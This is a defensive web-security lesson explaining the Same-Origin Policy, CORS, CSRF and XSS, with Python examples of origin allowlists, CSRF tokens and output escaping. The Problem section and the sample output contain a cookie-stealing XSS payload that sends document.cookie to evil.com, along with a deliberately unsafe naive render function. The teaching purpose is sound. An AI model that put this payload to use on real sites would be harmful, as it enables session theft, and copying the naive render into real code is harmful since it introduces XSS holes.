# The Browser Trust Boundary: CORS, CSRF & XSS

> The browser is the strangest client you have: you ship it your code, and then you can't trust it — because it will run *any* script that ends up on your page, and it will automatically attach your user's cookie to *any* request to your domain, no matter who initiated it. Those two behaviors create three attack classes the backend must actively defend: **XSS** (get a script onto the page), **CSRF** (ride the auto-attached cookie), and the **Same-Origin Policy / CORS** that governs what one origin may do to another. This lesson explains the browser's security model and the exact headers and tokens that defend each — because "we have a login" means nothing if a comment field can steal every session.

**Type:** Build
**Languages:** Python
**Prerequisites:** [Sessions & Secure Cookies](../05-sessions-and-secure-cookies/) · [Authentication, Authorization & the Security Mindset](../01-authn-authz-and-the-security-mindset/)
**Time:** ~75 minutes

## The Problem

Your app is two parts: an API and a web front-end the browser runs. Everything about auth so far — passwords, MFA, sessions, tokens, authorization — assumed the request came from something you could reason about. The browser breaks that assumption in two specific ways, and each opens an attack.

**It runs whatever script is on the page.** A user posts a product review containing `<script>fetch('https://evil.com/c?'+document.cookie)</script>`. Your server stores it and later renders it into the review list — as HTML. Now every visitor who views that page runs the attacker's script *inside your origin*, with full access to the page, the DOM, anything in `localStorage`, and any cookie not marked `HttpOnly`. One review field just became a session-stealing weapon aimed at every user who loads the page. This is **XSS** (Cross-Site Scripting), and it's a failure to separate *your data* from *executable code*.

**It auto-attaches your cookie to requests it didn't start.** Your user is logged into `bank.com` (a session cookie, [Lesson 5](../05-sessions-and-secure-cookies/)). In another tab they open `evil.com`, whose page silently submits a form: `POST bank.com/transfer` with `amount=5000&to=attacker`. The browser, seeing a request to `bank.com`, **attaches the bank.com cookie automatically** — because that's what browsers do — and your server sees a perfectly authenticated request and moves the money. The attacker never saw a password or read the response; they just borrowed the ambient authority of a logged-in cookie. This is **CSRF** (Cross-Site Request Forgery), and it exploits the fact that a cookie authenticates the *browser*, not the *intent*.

Underneath both sits the browser's foundational rule, the **Same-Origin Policy** — and the third source of confusion: developers who, fighting a "blocked by CORS" error, paste `Access-Control-Allow-Origin: *` into their API and unknowingly invite every website on the internet to read their responses. Understanding the Same-Origin Policy is what makes CORS, CSRF, and XSS stop being three mysterious error messages and become one coherent model. That model — and the specific server-side defenses for each attack — is this lesson.

## The Concept

### The browser's two dangerous gifts

Everything here follows from two browser behaviors that are *features*, not bugs, and that you must design around:

1. **The browser executes any script that becomes part of your page.** It can't tell your intended JavaScript from an attacker's — script is script. So if attacker-controlled text is ever interpreted as code, it runs with your page's full privileges. Defending this is **XSS prevention**.
2. **The browser attaches cookies based on the *destination*, not the *initiator*.** Any request to `bank.com` gets the `bank.com` cookies, whether the request came from `bank.com`'s own page or from `evil.com`. Defending this is **CSRF prevention**.

The **Same-Origin Policy** (SOP) is the rule that limits the damage, and **CORS** is the controlled way to relax it.

### The Same-Origin Policy: the foundational boundary

An **origin** is the triple **scheme + host + port** (`https://acme.com:443`). The SOP says: script running in one origin can freely interact with resources of the *same* origin, but is restricted from interacting with a *different* origin. Two URLs are the same origin only if all three parts match — the path is irrelevant:

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 316" width="100%" style="max-width:880px" role="img" aria-label="The Same-Origin Policy. An origin is scheme plus host plus port. Compared to https://acme.com, the URL https://acme.com/dashboard is same-origin (path is ignored); http://acme.com is a different origin (scheme differs); https://acme.com:8443 is different (port differs); https://api.acme.com is different (host differs). The crucial asymmetry: the Same-Origin Policy lets a page SEND a request to another origin, but blocks scripts from READING the response unless CORS explicitly allows it. CSRF abuses the send-is-allowed rule; CORS governs the read.">
  <text x="450" y="24" text-anchor="middle" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="15" font-weight="700" fill="currentColor">Origin = scheme + host + port — all three must match</text>
  <text x="450" y="52" text-anchor="middle" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="12" fill="currentColor">baseline: <tspan font-weight="700" fill="#3553ff">https://acme.com</tspan>  (scheme=https, host=acme.com, port=443)</text>
  <g font-family="'JetBrains Mono', ui-monospace, monospace" font-size="10.5">
    <g stroke="currentColor" stroke-width="1" opacity="0.15">
      <line x1="30" y1="74" x2="600" y2="74"/><line x1="30" y1="104" x2="600" y2="104"/><line x1="30" y1="134" x2="600" y2="134"/><line x1="30" y1="164" x2="600" y2="164"/>
    </g>
    <text x="40" y="94" fill="currentColor">https://acme.com/dashboard</text>
    <text x="470" y="94" fill="#0fa07f" font-weight="700">SAME  (path ignored)</text>
    <text x="40" y="124" fill="currentColor">http://acme.com</text>
    <text x="470" y="124" fill="#d64545" font-weight="700">DIFFERENT (scheme)</text>
    <text x="40" y="154" fill="currentColor">https://acme.com:8443</text>
    <text x="470" y="154" fill="#d64545" font-weight="700">DIFFERENT (port)</text>
    <text x="40" y="184" fill="currentColor">https://api.acme.com</text>
    <text x="470" y="184" fill="#d64545" font-weight="700">DIFFERENT (host)</text>
  </g>
  <g font-family="'JetBrains Mono', ui-monospace, monospace">
    <rect x="30" y="204" width="840" height="96" rx="10" fill="#e0930f" fill-opacity="0.07" stroke="#e0930f" stroke-opacity="0.6"/>
    <text x="44" y="226" font-size="11" font-weight="700" fill="#e0930f">The asymmetry that explains everything</text>
    <text x="44" y="248" font-size="10">• A page CAN <tspan font-weight="700">send</tspan> a request to another origin (submit a form, load an image, fire fetch) — the browser allows it and</text>
    <text x="58" y="264" font-size="10">attaches that origin's cookies.  → this is what <tspan font-weight="700" fill="#d64545">CSRF</tspan> abuses.</text>
    <text x="44" y="284" font-size="10">• A script CANNOT <tspan font-weight="700">read</tspan> the response from another origin unless that origin opts in with <tspan font-weight="700">CORS</tspan> headers.  → this is what <tspan font-weight="700">CORS</tspan> governs.</text>
  </g>
</svg>
```

That asymmetry is the key that unlocks the whole topic: **sending a cross-origin request is allowed; reading the cross-origin response is blocked by default.** CSRF works because *sending* is enough to change state (the attacker doesn't need to read anything). CORS exists to safely allow *reading* when you want it.

### CORS: relaxing the Same-Origin Policy on purpose

When your front-end at `https://app.acme.com` calls your API at `https://api.acme.com`, that's cross-origin, and the SOP blocks the front-end from reading the response — even though you own both. **CORS** (Cross-Origin Resource Sharing) is how the API *opts in*: it returns an `Access-Control-Allow-Origin` header naming the origins allowed to read its responses. For requests that can change state or carry custom headers, the browser first sends a **preflight** `OPTIONS` request asking "may I?", and only proceeds if the API's CORS headers approve. Two rules keep CORS safe:

- **Never use `Access-Control-Allow-Origin: *` with credentials.** The wildcard means "any website may read my responses," and browsers correctly forbid combining it with `Access-Control-Allow-Credentials: true` — but teams work around the error in dangerous ways. Instead, keep an **allowlist** of your origins, and reflect the request's `Origin` back only if it's on the list (and add `Vary: Origin` so caches don't cross wires).
- **CORS is not a server-side access control.** It tells the *browser* who may read a response; it does nothing to a non-browser client (curl, a server, an attacker's script running server-side). CORS is not authentication or authorization — it's a browser convenience with security implications, not a firewall.

### CSRF: riding the auto-attached cookie

CSRF turns the browser's cookie-attaching helpfulness into an attack. Because a cookie authenticates the browser regardless of who initiated the request, a malicious page can cause a state-changing request to your site that arrives fully authenticated:

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 360" width="100%" style="max-width:880px" role="img" aria-label="CSRF attack and defenses. The victim is logged into bank.com with a session cookie. They open evil.com, whose page auto-submits a POST to bank.com/transfer. The browser automatically attaches the bank.com cookie because the request goes to bank.com, so the server sees an authenticated request and moves the money — the attacker never reads the response. Three defenses: SameSite=Lax or Strict on the cookie so the browser doesn't send it on a cross-site POST; a CSRF token that the attacker's page can't know because the Same-Origin Policy blocks it from reading the victim's pages; and checking the Origin or Referer header server-side.">
  <defs>
    <marker id="l10c-ar" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="currentColor"/></marker>
  </defs>
  <text x="450" y="24" text-anchor="middle" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="15" font-weight="700" fill="currentColor">CSRF: the cookie authenticates the browser, not the intent</text>
  <g font-family="'JetBrains Mono', ui-monospace, monospace">
    <g fill="none" stroke-linejoin="round" stroke-width="1.8">
      <rect x="30" y="60" width="180" height="70" rx="10" fill="#d64545" fill-opacity="0.10" stroke="#d64545"/>
      <rect x="360" y="60" width="200" height="70" rx="10" fill="#7f7f7f" fill-opacity="0.10" stroke="currentColor" stroke-opacity="0.5"/>
      <rect x="700" y="60" width="180" height="70" rx="10" fill="#0fa07f" fill-opacity="0.11" stroke="#0fa07f"/>
    </g>
    <text x="120" y="84" font-size="11" font-weight="700" text-anchor="middle" fill="#d64545">evil.com</text>
    <text x="120" y="104" font-size="8.5" text-anchor="middle">page auto-submits a</text>
    <text x="120" y="118" font-size="8.5" text-anchor="middle">form to bank.com</text>
    <text x="460" y="84" font-size="11" font-weight="700" text-anchor="middle">VICTIM'S BROWSER</text>
    <text x="460" y="104" font-size="8.5" text-anchor="middle">attaches bank.com cookie</text>
    <text x="460" y="118" font-size="8.5" text-anchor="middle">(logged in, other tab)</text>
    <text x="790" y="84" font-size="11" font-weight="700" text-anchor="middle" fill="#0fa07f">bank.com</text>
    <text x="790" y="104" font-size="8.5" text-anchor="middle">sees a valid cookie →</text>
    <text x="790" y="118" font-size="8.5" text-anchor="middle">transfers the money ✗</text>
  </g>
  <g fill="none" stroke="currentColor" stroke-width="1.6">
    <path d="M210 95 L 356 95" marker-end="url(#l10c-ar)"/>
    <path d="M560 95 L 696 95" marker-end="url(#l10c-ar)"/>
  </g>
  <text x="285" y="88" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="8" text-anchor="middle" fill="currentColor" opacity="0.7">POST /transfer</text>
  <text x="628" y="88" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="8" text-anchor="middle" fill="currentColor" opacity="0.7">+ cookie (auto)</text>
  <g font-family="'JetBrains Mono', ui-monospace, monospace">
    <rect x="30" y="152" width="840" height="150" rx="10" fill="#0fa07f" fill-opacity="0.05" stroke="#0fa07f" stroke-opacity="0.6"/>
    <text x="44" y="174" font-size="11" font-weight="700" fill="#0fa07f">Three defenses (use SameSite + a token together)</text>
    <text x="44" y="198" font-size="10">① <tspan font-weight="700">SameSite=Lax / Strict</tspan> cookie — the browser won't send the cookie on a cross-site POST, so the forged request</text>
    <text x="58" y="214" font-size="10">arrives with no session. The modern default and the biggest single win (Lesson 5).</text>
    <text x="44" y="238" font-size="10">② <tspan font-weight="700">CSRF token</tspan> — a state-changing request must carry an unpredictable token the server issued. evil.com can't</text>
    <text x="58" y="254" font-size="10">know it: the Same-Origin Policy blocks it from reading the victim's bank.com pages. (synchronizer / double-submit)</text>
    <text x="44" y="278" font-size="10">③ <tspan font-weight="700">Check Origin / Referer</tspan> — reject state-changing requests whose Origin header isn't your own site.</text>
    <text x="44" y="296" font-size="9" opacity="0.75">Why not "read the response"? The attacker doesn't need to — the side effect (the transfer) already happened on send.</text>
  </g>
</svg>
```

The elegance of the **CSRF token** defense is that it turns the SOP's read-blocking to your advantage: you embed an unpredictable token in your own pages and require it on every state-changing request; an attacker's page can *send* a request but can't *read* your page to learn the token, so it can't include it. Combined with `SameSite` cookies (which stop the cookie being sent cross-site in the first place), CSRF is thoroughly defensible. Note that token-in-header auth (a JWT you attach via JavaScript, not an auto-sent cookie) is naturally CSRF-resistant — because the browser doesn't *auto*-attach it — which is one reason APIs consumed by SPAs sometimes prefer it; but the moment you store auth in a cookie, CSRF is back on the table.

### XSS: running as your origin

XSS is the more dangerous of the two, because a successful XSS **defeats the Same-Origin Policy entirely** — the attacker's script *is* running in your origin, so it can do anything your own JavaScript could: read the DOM, read `localStorage` (where many apps foolishly keep tokens, [Lesson 6](../06-jwt-and-token-auth/)), read non-`HttpOnly` cookies, and make authenticated requests as the user. It comes in three forms:

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 350" width="100%" style="max-width:880px" role="img" aria-label="XSS types and defenses. Stored XSS: attacker script is saved in the database (a comment) and served to every viewer. Reflected XSS: script in a URL parameter is echoed back into the page. DOM-based XSS: client-side JavaScript writes untrusted input into the page. In all three the script runs as your origin and can read the DOM, localStorage, non-HttpOnly cookies, and act as the user. Defenses: context-aware output encoding so data is never interpreted as code, a Content-Security-Policy that blocks inline and unauthorized scripts, HttpOnly cookies so a stolen script can't read the session, and sanitizing any rich HTML you must allow.">
  <text x="450" y="24" text-anchor="middle" font-family="'JetBrains Mono', ui-monospace, monospace" font-size="15" font-weight="700" fill="currentColor">XSS: attacker script runs AS your origin — SOP no longer protects you</text>
  <g font-family="'JetBrains Mono', ui-monospace, monospace">
    <g fill="none" stroke-linejoin="round" stroke-width="1.7">
      <rect x="20" y="46" width="284" height="120" rx="11" fill="#d64545" fill-opacity="0.07" stroke="#d64545" stroke-opacity="0.8"/>
      <rect x="308" y="46" width="284" height="120" rx="11" fill="#e0930f" fill-opacity="0.07" stroke="#e0930f" stroke-opacity="0.8"/>
      <rect x="596" y="46" width="284" height="120" rx="11" fill="#7c5cff" fill-opacity="0.07" stroke="#7c5cff" stroke-opacity="0.8"/>
    </g>
    <text x="162" y="70" font-size="11.5" font-weight="700" text-anchor="middle" fill="#d64545">STORED</text>
    <text x="162" y="92" font-size="9" text-anchor="middle">script saved in the DB</text>
    <text x="162" y="108" font-size="9" text-anchor="middle">(a comment, a profile)</text>
    <text x="162" y="128" font-size="9" text-anchor="middle">served to EVERY viewer</text>
    <text x="162" y="150" font-size="8.5" text-anchor="middle" opacity="0.7">most dangerous — persistent</text>
    <text x="450" y="70" font-size="11.5" font-weight="700" text-anchor="middle" fill="#e0930f">REFLECTED</text>
    <text x="450" y="92" font-size="9" text-anchor="middle">script in a URL param</text>
    <text x="450" y="108" font-size="9" text-anchor="middle">echoed into the page</text>
    <text x="450" y="128" font-size="9" text-anchor="middle">via a crafted link</text>
    <text x="450" y="150" font-size="8.5" text-anchor="middle" opacity="0.7">needs the victim to click</text>
    <text x="738" y="70" font-size="11.5" font-weight="700" text-anchor="middle" fill="#7c5cff">DOM-BASED</text>
    <text x="738" y="92" font-size="9" text-anchor="middle">client-side JS writes</text>
    <text x="738" y="108" font-size="9" text-anchor="middle">untrusted input into</text>
    <text x="738" y="128" font-size="9" text-anchor="middle">the page (innerHTML)</text>
    <text x="738" y="150" font-size="8.5" text-anchor="middle" opacity="0.7">never touches the server</text>
  </g>
  <g font-family="'JetBrains Mono', ui-monospace, monospace">
    <rect x="20" y="182" width="860" height="150" rx="10" fill="#0fa07f" fill-opacity="0.05" stroke="#0fa07f" stroke-opacity="0.6"/>
    <text x="34" y="204" font-size="11" font-weight="700" fill="#0fa07f">Defenses (layered — escaping is primary, CSP is the safety net)</text>
    <text x="34" y="228" font-size="10">① <tspan font-weight="700">Context-aware output encoding</tspan> — escape data for where it lands, so it's shown as text, never run as code:</text>
    <text x="48" y="244" font-size="10">&lt;script&gt; becomes &amp;lt;script&amp;gt; in HTML. This is THE fix — treat all user input as data. Frameworks auto-escape by default.</text>
    <text x="34" y="268" font-size="10">② <tspan font-weight="700">Content-Security-Policy</tspan> — a response header (script-src 'self') that blocks inline and unauthorized scripts,</text>
    <text x="48" y="284" font-size="10">so even an injected script won't run. A safety net for when escaping is missed, not a replacement for it.</text>
    <text x="34" y="308" font-size="10">③ <tspan font-weight="700">HttpOnly cookies</tspan> — a stolen script can't read the session cookie (Lesson 5).  ④ <tspan font-weight="700">Sanitize</tspan> rich HTML you must allow (DOMPurify / bleach).</text>
  </g>
</svg>
```

The root cause of XSS is always the same: **untrusted data was interpreted as code** because it was placed into a page without being encoded for its context. The primary fix is therefore **context-aware output encoding** — escaping data differently depending on whether it lands in HTML body, an HTML attribute, a URL, or a `<script>` block, so it's always rendered as inert text. Modern frameworks (React, Vue, Django templates, Jinja2 with autoescape) do this by default, which is why XSS most often appears when someone bypasses the framework — `dangerouslySetInnerHTML`, `|safe`, string-building HTML by hand. On top of encoding, a **Content-Security-Policy** (CSP) header is a powerful safety net: `Content-Security-Policy: script-src 'self'` tells the browser to run only scripts from your own origin and to block inline scripts, so an injected `<script>` simply doesn't execute even if encoding was missed somewhere. And `HttpOnly` (Lesson 5) narrows the damage of any XSS by keeping the session cookie out of JavaScript's reach.

### The unified model

All three are one story about the browser boundary. The **Same-Origin Policy** is the model: it isolates origins. **CORS** is a deliberate, server-controlled relaxation of the *read* restriction. **CSRF** abuses the fact that SOP still allows cross-origin *sends* (with cookies) — defended by not sending the cookie cross-site (`SameSite`) and requiring an unforgeable token. **XSS** doesn't abuse the SOP — it *defeats* it by running as your origin — defended by never letting data become code (encoding + CSP). Keep the map in mind and the three stop being separate mysteries.

## Build It

Standard library only — `html`, `hmac`, `hashlib`, `secrets` — to implement the server-side pieces: a correct CORS allowlist (not `*`), CSRF token issue-and-verify, an `Origin` check, and context-aware output encoding that renders an XSS payload inert, contrasted with the naive concatenation that doesn't.

CORS done right reflects only allowlisted origins and never wildcards credentials:

```python
ALLOWED = {"https://app.acme.com", "https://admin.acme.com"}

def cors_headers(request_origin: str) -> dict:
    if request_origin in ALLOWED:                    # reflect only known origins — never "*"
        return {"Access-Control-Allow-Origin": request_origin,
                "Access-Control-Allow-Credentials": "true",
                "Vary": "Origin"}                    # so caches don't mix origins
    return {}                                         # unknown origin: no CORS grant
```

CSRF defense pairs a token the attacker can't read with an `Origin` check:

```python
def issue_csrf(session_id: str, key: bytes) -> str:
    return hmac.new(key, session_id.encode(), hashlib.sha256).hexdigest()   # bound to the session

def check_csrf(request_token: str, session_id: str, key: bytes, origin: str) -> bool:
    if origin not in ALLOWED:                        # reject cross-site state changes
        return False
    expected = issue_csrf(session_id, key)
    return hmac.compare_digest(request_token, expected)   # constant-time
```

And XSS prevention is output encoding — the same input is inert when escaped, live when concatenated:

```python
import html
def render_comment_safe(text: str) -> str:
    return f"<div class='comment'>{html.escape(text)}</div>"   # data stays data
def render_comment_naive(text: str) -> str:
    return f"<div class='comment'>{text}</div>"                # data becomes code — XSS
```

The full script — CORS allowlist vs the `*` mistake, CSRF accept/reject with a wrong token and a cross-site origin, and the escaped-vs-naive render of a `<script>` payload plus a CSP header — is in [`code/browser_security.py`](code/browser_security.py). Run it:

```console
$ python3 browser_security.py
== 1 · CORS: ALLOWLIST, NEVER `*` WITH CREDENTIALS ==
  Origin https://app.acme.com  -> Access-Control-Allow-Origin: https://app.acme.com (+ Vary: Origin)
  Origin https://evil.com      -> (no CORS headers) — not on the allowlist
  note: `Access-Control-Allow-Origin: *` with credentials is refused by browsers, and opens your API

== 2 · CSRF TOKEN + ORIGIN CHECK ==
  legit POST (correct token, own origin)     -> accepted
  forged POST (no/wrong token)               -> rejected  ✓
  forged POST (evil.com origin)              -> rejected  ✓

== 3 · XSS: OUTPUT ENCODING MAKES DATA INERT ==
  payload: <script>fetch('//evil.com?c='+document.cookie)</script>
  naive render : <div class='comment'><script>fetch('//evil.com?c='+document.cookie)</script></div>
  safe render  : <div class='comment'>&lt;script&gt;fetch(&#x27;//evil.com?c=&#x27;+document.cookie)&lt;/script&gt;</div>
  the safe version shows the text; the browser never executes it

== 4 · CSP AS A SAFETY NET ==
  Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'
  even an injected <script> won't run: inline and cross-origin scripts are blocked
```

**Section 1** shows CORS reflecting only allowlisted origins and denying `evil.com` — and why `*`-with-credentials is a hole. **Section 2** shows the CSRF token accepted for a legit request and rejected for a forged one (wrong token) and a cross-site one (bad origin). **Section 3** is the heart of XSS defense: the identical payload is a live `<script>` when concatenated and inert `&lt;script&gt;` text when escaped. **Section 4** shows the CSP that would block the script even if encoding were missed.

## Use It

In production you lean almost entirely on framework and browser mechanisms — and the main skill is *not disabling them*. For **CORS**, use the framework middleware with an **explicit origin allowlist**, never `*` with credentials: FastAPI's `CORSMiddleware(allow_origins=[...])`, Django's `django-cors-headers`, Express's `cors({origin: [...]})`. For **CSRF**, use the built-in protection — Django and Rails ship CSRF tokens on by default; Flask uses `Flask-WTF`; and set your session cookie **`SameSite=Lax`** ([Lesson 5](../05-sessions-and-secure-cookies/)) as the first line of defense. For **XSS**, rely on your template engine's **auto-escaping** (Jinja2, Django templates, React's JSX all escape by default) and treat every escape-bypass (`|safe`, `dangerouslySetInnerHTML`, `v-html`) as a security review item; if you must accept rich HTML, run it through a **sanitizer** (`bleach`/`nh3` server-side, `DOMPurify` client-side) rather than trusting it. And deploy a **Content-Security-Policy** — start in report-only mode to find violations, then enforce `script-src 'self'` (avoiding `'unsafe-inline'`), which neutralizes most XSS even when a bug slips through.

The strategic rules that tie it together: **the browser is an untrusted execution environment you happen to ship code to.** Set `HttpOnly`, `Secure`, and `SameSite` on auth cookies (Lesson 5); **encode all output** and let the framework do it; **allowlist CORS origins** and remember CORS protects browsers, not your server; require a **CSRF token** for cookie-authenticated state changes; and ship a **CSP**. None of these are optional niceties — a single missed output-encode in a comment field, or a stray `Access-Control-Allow-Origin: *`, can undo every other lesson in this phase.

## Think about it

1. Your API at `api.acme.com` returns `Access-Control-Allow-Origin: *` and you're relieved the "CORS error" is gone. The API uses cookie auth. Explain what you've actually exposed, why browsers *block* combining `*` with credentials, and what the correct configuration is.
2. A colleague says "we're safe from CSRF because we validate the session cookie on every request." Explain precisely why that's exactly the property CSRF exploits, and which two defenses actually stop it.
3. Why can an attacker's page *send* a cross-site `POST` to your bank but not *read* the response — and why does CSRF not care that it can't read the response? Tie your answer to the Same-Origin Policy's send/read asymmetry.
4. XSS is called worse than CSRF because it "defeats the Same-Origin Policy rather than abusing it." Unpack that: once an attacker's script runs in your origin, list four things it can do, and say which single cookie flag limits one of them (and which it doesn't limit).
5. Output encoding and CSP both defend against XSS. Explain why encoding is the *primary* defense and CSP is a *safety net* — and give a concrete case where CSP saves you even though your encoding had a bug.

## Key takeaways

- **The browser gives you two behaviors you must design around:** it runs any script that becomes part of your page (→ XSS), and it auto-attaches cookies based on the request's destination, not its initiator (→ CSRF). Auth alone doesn't defend either.
- **The Same-Origin Policy** (origin = scheme + host + port) isolates origins, with a crucial asymmetry: a page **can send** a cross-origin request (with cookies) but **cannot read** the response by default. CSRF abuses the send; CORS governs the read.
- **CORS** is a deliberate, server-controlled relaxation of the read restriction — use an **explicit origin allowlist**, never `*` with credentials, add `Vary: Origin`, and remember **CORS protects browsers, not your server** (it's not authorization).
- **CSRF** rides the auto-attached cookie to make authenticated state changes. Defend with **`SameSite` cookies** (don't send cross-site) and an **unforgeable CSRF token** (the attacker can't read your page to learn it), plus an `Origin` check; token-in-header auth is naturally CSRF-resistant.
- **XSS defeats the SOP entirely** by running as your origin — it can read the DOM, `localStorage`, non-`HttpOnly` cookies, and act as the user. The root cause is untrusted data interpreted as code; the primary fix is **context-aware output encoding** (frameworks auto-escape), backed by a **Content-Security-Policy** and `HttpOnly` cookies.
- **These are one model, not three tricks.** SOP isolates; CORS relaxes reads; CSRF abuses sends; XSS breaks isolation. A single missed output-encode or a stray `*` can undo the entire phase — the defenses are headers, cookie flags, and encoding, and the job is to not turn them off.

Next: [Injection & the OWASP Top 10 for Backends](../11-injection-and-owasp-top-10/) — XSS was untrusted data interpreted as code in the *browser*; next you meet the same root cause on the *server* — SQL injection, command injection, SSRF — and the OWASP Top 10 that catalogs the vulnerabilities this whole phase has been dismantling.
